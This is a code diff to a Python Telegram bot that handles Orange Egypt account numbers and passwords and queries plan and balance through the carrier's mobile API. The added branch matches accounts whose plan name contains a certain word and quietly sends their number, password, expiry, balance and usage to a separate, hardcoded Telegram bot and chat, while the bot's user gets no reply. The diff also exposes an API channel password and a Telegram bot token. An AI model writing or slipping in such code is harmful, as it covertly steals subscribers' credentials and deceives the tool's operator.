@@ -47,7 +47,24 @@ def ps(message):
       r5 = requests.post(url5,headers=hd5,data=data5).json()
       Balance = r5['Balance']
       PlanName = r5['PlanName']
-      bot.send_message(message.chat.id,f"<strong>New Account my orange🍊 .....!\n- - - - - - - - - - - - - - - - -\n>>>Number : {number}\n>>>Password : {password}\n>>>Plan : {PlanName}\n>>>Balance : {Balance}\n- - - - - - - - - - - - - - - - -\n>>></strong>",parse_mode="html")
+      if "ستار" in PlanName:
+        ExpiryDate=r5['ExpiryDate']
+        url8 = "https://services.orange.eg/GetToken.svc/GenerateToken"
+        hd8 = {"Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
+        data8 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
+        ctv4 = requests.post(url8,headers=hd8,data = data8).json()["GenerateTokenResult"]["Token"]
+        a4=ctv4+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
+        htv4=(sha256(a4.encode('utf-8')).hexdigest().upper())
+        hd9 = {"_ctv": ctv4,"_htv": htv4,"isEasyLogin": "false","Content-Type": "application/json; charset=UTF-8","Content-Length": "190","Host": "services.orange.eg","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
+        url9 = "https://backend.orange.eg/api/Dashboard/GetInternetConsumption"
+        data9 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"Dial":"%s","IsEasyLogin":false,"Lang":"ar","Password":"%s"}' %(number,password)
+        r9 = requests.post(url9,headers=hd9,data=data9).json()
+        msg = ("Number: "+number+"\n"+"Password: "+password+"\n"+"PlanName: "+str(PlanName)+"\n"+"ExpiryDate: "+str(ExpiryDate)+"\n"+"Balance: "+str(Balance)+"\n"+str(r9))
+        print(msg)
+        tele = f"https://api.telegram.org/bot5586148435:AAGkrrpK5N_M4f82gnHznRp0TDeXzaX90gs/sendMessage?chat_id=1782571717&text={msg}"
+        send = requests.post(tele)
+      else:
+        bot.send_message(message.chat.id,f"<strong>New Account my orange🍊 .....!\n- - - - - - - - - - - - - - - - -\n>>>Number : {number}\n>>>Password : {password}\n>>>Plan : {PlanName}\n>>>Balance : {Balance}\n- - - - - - - - - - - - - - - - -\n>>></strong>",parse_mode="html")
       #------------------------------------------
     else :
       msga = ("Wrong Number "+str(x))
